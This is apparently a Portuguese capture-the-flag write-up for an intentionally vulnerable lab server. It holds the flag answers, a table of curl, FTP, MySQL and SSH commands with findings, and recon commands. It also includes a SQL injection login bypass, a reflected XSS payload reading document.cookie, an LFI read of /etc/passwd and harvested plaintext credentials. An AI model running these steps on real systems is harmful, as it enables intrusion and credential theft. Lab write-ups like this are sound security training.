FLAGs:
1) `FLAG{b4s1c_s0urc3_c0d3_1nsp3ct10n}`: Inspeção básica de código fonte.
2) `FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty} (FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D)`: XSS Refletido
3) `FLAG{r0b0ts_txt_l34k4g3}`: Robots.txt.
4) `FLAG{s3cr3t_p4n3l_d1sc0v3ry}`: Descoberta de painel secreto.
5) `FLAG{d4t4b4s3_cr3d3nt14ls_3xp0s3d}`: Exposição de credenciais de banco de dados.
6) `FLAG{p4ssw0rd_f1l3_d1sc0v3ry}`: Descoberta de arquivo de senha.
7) `FLAG{c0nf1g_f1l3_r34d}`: Arquivo de configuração lido.
8) `FLAG{ftp_4n0nym0us_4cc3ss}`: Acesso Anônimo FTP.
9) `FLAG{sql_1nj3ct10n_m4st3r}`: SQL Injection Master.
10) `FLAG{h1dd3n_d4t4_1n_d4t4b4s3}`: Dado oculto no banco de dados.
11) `FLAG{v13w_d1sc0v3ry_4dv4nc3d}`: Descoberta de view avançada.
12) `FLAG{ssh_h0m3_d1r3ct0ry_3xpl0r4t10n}`: Exploração de diretório home via SSH.
13) `FLAG{b4sh_h1st0ry_l34k}`: Vazamento de histórico do bash.
14) `FLAG{scr1pt_4n4lys1s_sk1ll} (FLAG{b4ckup_scr1pt_f0und})`: Script de backup encontrado.
15) `FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}`: Escalonamento de privilégios.
16) `FLAG{g1t_cr3d3nt14ls_l34k}`: Vazamento de credenciais do Git.


| Num | Porta | Página | Comando | Evidência | Descobertas |
|-----|-------|--------|----------|-----------|-------------|
| 1 | 80 | index.php | `curl http://98.95.207.28/` | [index.txt](./98.95.207.28/80/index.txt) | - |
| 2 | 80 | about.php | `curl http://98.95.207.28/about.php` | [about.txt](./98.95.207.28/80/about.txt) | - |
| 3 | 80 | contact.php | `curl http://98.95.207.28/contact.php` | [contact.txt](./98.95.207.28/80/contact.txt) | - |
| 4 | 80 | services.php | `curl http://98.95.207.28/services.php` | [services.txt](./98.95.207.28/80/services.txt) | - |
| 5 | 80 | login.php / dashboard.php | `curl http://98.95.207.28/login.php` | [login.txt](./98.95.207.28/80/login.php/login.txt) | Vazamento de Credenciais |
| 6 | 80 | login.php / dashboard.php | `curl -i -c /dev/null -d "username=user&password=password123" -X POST http://98.95.207.28/login.php` | [xss-login.txt](./98.95.207.28/80/login.php/xss-login.txt) | Vulnerabilidade XSS Refletido |
| 7 | 80 | login.php / dashboard.php | `curl -sS -L -c /dev/null --data-urlencode "username=user" --data-urlencode "password=password123" "http://98.95.207.28/login.php"` | [xss-login.txt](./98.95.207.28/80/login.php/xss-login.txt) | Vulnerabilidade XSS Refletido |
| 8 | 80 | login.php / dashboard.php | `curl -sS -c cookies.txt -d "username=user" -d "password=password123" http://98.95.207.28/login.php` e `curl -sS -b cookies.txt "http://98.95.207.28/dashboard.php?page=projects"` | [xss_page-login.txt](./98.95.207.28/80/login.php/xss_page-login.txt) | Vulnerabilidade XSS Refletido via parâmetro page |
| 9 | 80 | login.php / dashboard.php | `curl -sS -L -c /dev/null --data-urlencode "username=admin" --data-urlencode "password=' OR '1'='1" "http://98.95.207.28/login.php"` | [sqli-login.txt](./98.95.207.28/80/login.php/sqli-login.txt) | Vulnerabilidade SQL Injection |
| 10 | 80 | login.php / admin.php | `curl -sS -c cookies.txt -d "username=admin" -d "password=admin123" http://98.95.207.28/login.php` e `curl -sS -b cookies.txt "http://98.95.207.28/admin.php"` | [admin.txt](./98.95.207.28/80/login.php/admin.txt) | Autenticação com Admin |
| 11 | 80 | login.php / admin.php | `curl -sS -c cookies.txt -d "username=superadmin" -d "password=Sup3r@dm1n\!2024#Secure" http://98.95.207.28/login.php` e `curl -sS -b cookies.txt "http://98.95.207.28/admin.php"` | [superadmin.txt](./98.95.207.28/80/login.php/superadmin.txt) | Autenticação com SuperAdmin |
| 12 | 80 | login.php / git-credentials | `curl http://98.95.207.28/.git-credentials` | [git-credentials.txt](./98.95.207.28/login.php/80/git-credentials.txt) | Credenciais do GitHub Expostas |
| 13 | 80 | robots.txt | `curl http://98.95.207.28/robots.txt` | [robots.txt](./98.95.207.28/80/robots.txt) | Exposição do Arquivo Robots.txt |
| 14 | 80 | panel.php | `curl http://98.95.207.28/panel.php` | [panel.txt](./98.95.207.28/80/panel.txt) | LFI Identificada |
| 15 | 80 | /etc/passwd | `curl http://98.95.207.28/panel.php?file=/etc/passwd` | [passwd.txt](./98.95.207.28/80/passwd.txt) | Exposição de Arquivo do Sistema |
| 16 | 80 | config/ | `curl http://98.95.207.28/config/` | [config.txt](./98.95.207.28/80/config/config.txt) | Directory Listing Habilitado |
| 17 | 80 | config/database.php | `curl http://98.95.207.28/config/database.php` | - | - |
| 18 | 80 | config/database.php.txt | `curl http://98.95.207.28/config/database.php.txt` | [database.txt](./98.95.207.28/80/config/database.txt) | Vazamento de Credenciais de Banco de Dados |
| 19 | 21 | /srv/ftp | `curl ftp://anonymous:anonymous@98.95.207.28/` | [ftp.txt](./98.95.207.28/21/ftp.txt) | PENDENTE |
| 20 | 21 | /srv/ftp/Dockerfile | `curl ftp://anonymous:anonymous@98.95.207.28/Dockerfile` | [dockerfile.txt](./98.95.207.28/21/dockerfile.txt) | Vazamento de Dockerfile do servidor FTP |
| 21 | 21 | /srv/ftp/confidential/passwords.txt | `curl ftp://anonymous:anonymous@98.95.207.28/confidential/passwords.txt` | [passwords.txt](./98.95.207.28/21/passwords.txt) | Vazamento de Credenciais de Serviços |
| 22 | 21 | /srv/ftp/public/readme.txt | `curl ftp://anonymous:anonymous@98.95.207.28/public/readme.txt` | [readme.txt](./98.95.207.28/21/readme.txt) | - |
| 23 | 21 | /srv/ftp/users.conf | `curl ftp://anonymous:anonymous@98.95.207.28/users.conf` | [users.conf.txt](./98.95.207.28/21/users.conf.txt) | Vazamento de Credenciais de Usuários FTP |
| 24 | 21 | /srv/ftp/welcome.txt | `curl ftp://anonymous:anonymous@98.95.207.28/welcome.txt` | [welcome.txt](./98.95.207.28/21/welcome.txt) | Acesso Anônimo Habilitado |
| 25 | 8080 | phpMyAdmin | `curl http://98.95.207.28:8080` | [phpmyadmin.txt](./98.95.207.28/8080/phpmyadmin.txt) | Banco de Dados Exposto Publicamente via phpMyAdmin |
| 26 | 3306 | mysql | `mysql -h 98.95.207.28 --skip-ssl -u techcorp_user -p T3chC0rp_S3cr3t_2024!` | [mysql.txt](./98.95.207.28/3306/mysql.txt) | Banco de Dados Exposto Publicamente |
| 27 | 2222 | ssh | `ssh -p 2222 techcorp@98.95.207.28` e `TechCorp2024!` | [ssh.txt](./98.95.207.28/2222/ssh.txt) | Acesso Remoto SSH via Senha Habilitado. |
| 28 | 2222 | bash_history | `cat .bash_history` | [bash_history.txt](./98.95.207.28/2222/bash_history.txt) | Histórico do Bash Exposto |
| 29 | 2222 | script_analysis | `cat /opt/backup_script.sh` | [script_analysis.txt](./98.95.207.28/2222/script_analysis.txt) | Arquivo de Script de Backup do Banco de Dados Exposto |


| Nº | Flag |
|----|------|
| 1 | `FLAG{b4s1c_s0urc3_c0d3_1nsp3ct10n}` |
| 2 | No |
| 3 | No |
| 4 | No |
| 5 | No |
| 6 | `FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}` |
| 7 | `FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}` |
| 8 | No |
| 9 | `FLAG{sql_1nj3ct10n_m4st3r}` |
| 10 | No |
| 11 | `FLAG{pr1v1l3g3_3sc4l4t10n_succ3ss}` |
| 12 | `FLAG{g1t_cr3d3nt14ls_l34k}` |
| 13 | `FLAG{r0b0ts_txt_l34k4g3}` |
| 14 | `FLAG{s3cr3t_p4n3l_d1sc0v3ry}` |
| 15 | No |
| 16 | No |
| 17 | No |
| 18 | `FLAG{d4t4b4s3_cr3d3nt14ls_3xp0s3d}` |
| 19 | No |
| 20 | No |
| 21 | `FLAG{p4ssw0rd_f1l3_d1sc0v3ry}` |
| 22 | No |
| 23 | `FLAG{c0nf1g_f1l3_r34d}` |
| 24 | `FLAG{ftp_4n0nym0us_4cc3ss}` |
| 25 | `FLAG{h1dd3n_d4t4_1n_d4t4b4s3}`, `FLAG{v13w_d1sc0v3ry_4dv4nc3d}` |
| 26 | mesmas flags |
| 27 | `FLAG{ssh_h0m3_d1r3ct0ry_3xpl0r4t10n}` |
| 28 | `FLAG{b4sh_h1st0ry_l34k}` |
| 29 | `FLAG{scr1pt_4n4lys1s_sk1ll}` |




- **Vazamento de Credenciais**: Foi identificado um vazamento direto de credenciais na própria página do site, expondo o usuário `user` com a senha `password123`. Além do vazamento explícito, trata-se também de uma senha fraca e facilmente explorável, aumentando significativamente o risco de acesso não autorizado ao sistema.
- **Vulnerabilidade XSS Refletido**: Após a autenticação com as credenciais vazadas, a resposta da requisição retornou o cookie `admin_secret`, contendo uma *flag* que confirma a presença de uma vulnerabilidade de **XSS Refletido**. Essa vulnerabilidade foi validada na página `dashboard.php`, carregada após o login, demonstrando que parâmetros recebidos pelo servidor são refletidos na resposta sem a devida sanitização.
- **Vulnerabilidade XSS Refletido**: Após autenticar com o usuário `user`, foi possível explorar uma vulnerabilidade de **XSS Refletido** no campo *Pesquisar no Sistema* da página `dashboard.php`. Ao enviar o payload `<script>alert(document.cookie)</script>` — tanto diretamente no formulário quanto via requisição como `http://98.95.207.28/dashboard.php?search=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E` - o navegador executava o JavaScript inserido e exibindo o cookie da sessão que incluía a flag.  
- **Vulnerabilidade XSS Refletido via parâmetro page**: Após o login, outra vulnerabilidade de **XSS Refletido** foi identificada no parâmetro `page` das URLs: `http://98.95.207.28/dashboard.php?page=projects` e `http://98.95.207.28/dashboard.php?page=clients`. O valor fornecido no parâmetro era refletido diretamente no HTML, permitindo a exploração de XSS caso seja substituído por um payload malicioso. Além disso, o conteúdo desse parâmetro controla seções internas da aplicação, podendo expor dados sensíveis ou modificar dinamicamente partes da página sem qualquer validação.
- **Vulnerabilidade SQL Injection:** Na página `login.php` foi identificada uma vulnerabilidade de **SQL Injection** no campo de senha. A aplicação não realizava tratamento adequado da entrada, permitindo que payloads maliciosos manipulem a consulta SQL e resultem em autenticação indevida.
- **Autenticação com Admin:** O usuário admin pôde acessar o painel administrativo utilizando a senha encontrada no arquivo `secret.txt` durante o acesso remoto via SSH — senha que também estava registrada na tabela de usuários do banco de dados. Com esse login, foi possível acessar um redirecionamento exclusivo para `admin.php`, página que não estava disponível para o usuário comum `user`.
- **Autenticação com SuperAdmin:** O acesso como `superadmin` foi obtido utilizando a senha presente na tabela de usuários do banco de dados. Embora o usuário `superadmin` não tivesse um caminho explícito para a página `admin.php`, o acesso foi forçado manualmente, já que essa página havia sido identificada e acessada anteriormente com o usuário `admin`.
- **Credenciais do GitHub Expostas**: Com acesso de `superadmin`, foi possível visualizar o arquivo `.git-credentials`, que continha credenciais de acesso ao GitHub expostas de forma indevida.
- **Exposição do Arquivo `robots.txt`:** O arquivo `robots.txt` informa aos crawlers de mecanismos de busca quais diretórios não devem ser indexados. Porém, ao ser disponibilizado publicamente, acabou revelando diretórios sensíveis como `/admin/`, `/backup/`, `/.git/`, `/config/` e o arquivo `/backup/database_backup_2024.sql`. Isso fornecia pistas importantes para atacantes sobre a estrutura interna do sistema. Entre esses diretórios, apenas `/config/` foi confirmado como existente durante a análise.
- **LFI Identificada:** A vulnerabilidade de **Local File Inclusion (LFI)** ocorre quando um parâmetro controla qual arquivo será carregado pelo servidor, permitindo que um atacante faça a aplicação ler e exibir arquivos locais. Sem validação adequada na entrada, é possível acessar arquivos sensíveis do sistema e visualizar seus conteúdos diretamente na resposta da página. Na aplicação analisada, a página `panel.php` permitia carregar três arquivos internos: `?file=logs`, `?file=config` e `?file=users`. Além disso, os próprios arquivos retornados sugeriam outros caminhos que podiam ser explorados, como: `?file=/etc/passwd` e `?file=config/database.php`. 
- **Exposição de Arquivo do Sistema**: O arquivo `/etc/passwd`, que contém informações dos usuários do sistema, estava sendo exposto indevidamente através da vulnerabilidade de LFI presente na página `panel.php`.
- **Directory Listing Habilitado**: O servidor web permitia listagem de diretórios, portanto foi possível identificar dois arquivos dentro da pasta (`database.php` e `database.php.txt`).
- **Vazamento de Credenciais de Banco de Dados**: No arquivo `config/database.php.txt` foram vazadas as seguintes credenciais: host:`db`, user:`techcorp_user`, pass:`T3chC0rp_S3cr3t_2024!` e name:`techcorp_db`.
- **Vazamento de Dockerfile do servidor FTP**: O arquivo Dockerfile utilizado pelo servidor FTP estava acessível publicamente dentro do próprio servidor, expondo detalhes da configuração interna.
- **Vazamento de Credenciais de Serviços**: O arquivo `passwords.txt`, presente no servidor FTP, continha credenciais sensíveis de diversos serviços (FTP, SSH, Database, Wi-Fi, VPN).
- **Vazamento de Credenciais de Usuários FTP**: O arquivo `users.conf`, também disponível no servidor FTP, expunha credenciais de usuários do serviço FTP.
- **Acesso Anônimo Habilitado**: O arquivo `welcome.txt` dentro do servidor FTP indicava que o acesso anônimo estava habilitado, caracterizando uma vulnerabilidade de segurança.
- **Banco de Dados Exposto Publicamente via phpMyAdmin**: O phpMyAdmin estava acessível publicamente na porta **8080**, permitindo interação direta com o banco de dados. Uilizando as credenciais encontradas no arquivo `config/database.php.txt`, foi possível autenticar no sistema e acessar o banco `techcorp_db`. Nesse banco foram identificadas quatro tabelas (`clients`, `contacts`, `secret_data` e `users`), todas com acesso completo aos dados. Na tabela `secret_data`, além da flag de SQL Injection já identificada anteriormente, uma segunda flag também estava presente. Informações sensíveis adicionais foram encontradas, incluindo o segredo de API `sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG` e o caminho do arquivo de backup do banco (`/var/backups/techcorp/backup_20240115.tar.gz`). Por fim, uma view no banco também continha outra flag, contribuindo para o vazamento de informações críticas da aplicação.
- **Banco de Dados Exposto Publicamente**: O serviço MySQL estava acessível publicamente na porta **3306**, permitindo conexão remota direta ao banco. Utilizando as credenciais encontradas no arquivo `config/database.php.txt`, foi possível autenticar no sistema e acessar os dados do banco — os mesmos anteriormente obtidos via phpMyAdmin.
- **Acesso Remoto SSH via Senha Habilitado**: O serviço SSH estava acessível na porta **2222** e permitia autenticação por senha. Utilizando as credenciais encontradas no arquivo `passwords.txt` no servidor FTP, foi possível realizar login no servidor. O acesso ocorreu no diretório `/home/techcorp`, onde foram identificados dois arquivos importantes: `secret.txt` e `todo.txt`, que continham informações sensíveis do sistema.
- **Histórico do Bash Exposto**: No diretório `/home/techcorp` foi encontrado o arquivo `.bash_history`, expondo todos os comandos executados anteriormente no shell Bash, incluindo ações sensíveis e potencialmente comprometerdoras.
- **Arquivo de Script de Backup do Banco de Dados Exposto**: Com o acesso remoto via SSH, foi identificado um script de backup do banco de dados contendo credenciais do usuário root, representando um risco crítico de comprometimento total do sistema.






- index.php:
    - Vazamento de Credenciais;
- login.php / dashboard.php:
    - XSS Refletido; XSS Refletido via parâmetro page; SQL Injection.
- login.php / admin.php:
    - Acesso autenticado com usuário admin e superadmin.
- robots.txt:
    - Exposição Pública do Arquivo robots.txt.
- panel.php:
    - LFI; Exposição Pública do Arquivo /etc/passwd.
- config/database.php.txt:
    - Vazamento de Credenciais de Banco de Dados.
- /srv/ftp/Dockerfile:
    - Vazamento de Dockerfile do servidor FTP.
- /srv/ftp/confidential/passwords.txt:
    - Vazamento de Credenciais de Serviços.
- /srv/ftp/users.conf:
    - Vazamento de Credenciais de Usuários FTP.
- /srv/ftp/welcome.txt:
    - Acesso Anônimo Habilitado.
- phpMyAdmin:
    - Banco de Dados Exposto Publicamente via phpMyAdmin.
- mysql:
    - Banco de Dados Exposto Publicamente.
- ssh:
    - Acesso remoto SSH via Senha Hbilitado.
- historico_bash:
    - Histórico do Bash Exposto.
- script_analysis:
    - Arquivo de Script de Backup do Banco de Dados Exposto.



🗺️ Mapeamento da Infraestrutura — 98.95.207.28   
📡 Hosts Internos Identificados (Rede 172.20.0.0/24)
- **172.20.0.1 — Aplicação Principal:**
    - 20/tcp — FTP-Data
    - 21/tcp — FTP
    - 22/tcp — SSH
    - 80/tcp — HTTP (Site principal)
    - 2222/tcp — SSH alternativo
    - 3306/tcp — MySQL
    - 8080/tcp — HTTP-Proxy (phpMyAdmin)
- **172.20.0.2 — Servidor MySQL:**
    - 3306/tcp — MySQL
- **172.20.0.3 — Servidor phpMyAdmin:**
    - 80/tcp — HTTP (Interface phpMyAdmin)
- **172.20.0.10 — Servidor Web da Aplicação:**
    - 80/tcp — HTTP
- **172.20.0.20 — Servidor FTP:**
    - 21/tcp — FTP
- **172.20.0.30 — Servidor SSH (Container Interno):**
    - 22/tcp — SSH

📁 Estrutura de Arquivos Mapeada

/ (Raiz)   
├── var/   
│   └── www/   
│       └── html/   
│           ├── index.php   
│           ├── about.php   
│           ├── contact.php   
│           ├── login.php -> dashboard.php   
│           │   ├── admin.php   
│           │   └── .git-credentials   
│           ├── services.php   
│           ├── panel.php   
│           ├── robots.txt   
│           ├── config/   
│           │   ├── database.php   
│           │   └── database.php.txt   
├── opt/   
│   └── backup_script.sh  
│   
├── etc/   
│   └── passwd   
│   
└── srv/   
    └── ftp/   
        ├── Dockerfile   
        ├── confidential/   
        │   └── passwords.txt   
        ├── ftp/   
        │   ├── confidential/   
        │   │   └── passwords.txt   
        │   ├── public/   
        │   │   └── readme.txt   
        │   └── welcome.txt   
        ├── public/   
        ├── users.conf   
        └── welcome.txt   



whois 98.95.207.28: O bloco de IP pertence à AWS, especificamente à região us-east-1 (porque o reverse DNS mostrou compute-1.amazonaws.com, que é N. Virginia).
host 98.95.207.28: Confirma a EC2.
ping -c 4 98.95.207.28: Não pinga, provavelmente ICMP está bloqueado no destino.
traceroute 98.95.207.28: 

sudo nmap -sS -Pn --top-ports 100 98.95.207.28
sudo nmap -sV -sC --top-ports 1000 98.95.207.28


gobuster dir -u http://98.95.207.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,conf,~ --wildcard forced -b "404,403" -t 50
[gobuster.txt](./98.95.207.28/gobuster.txt)


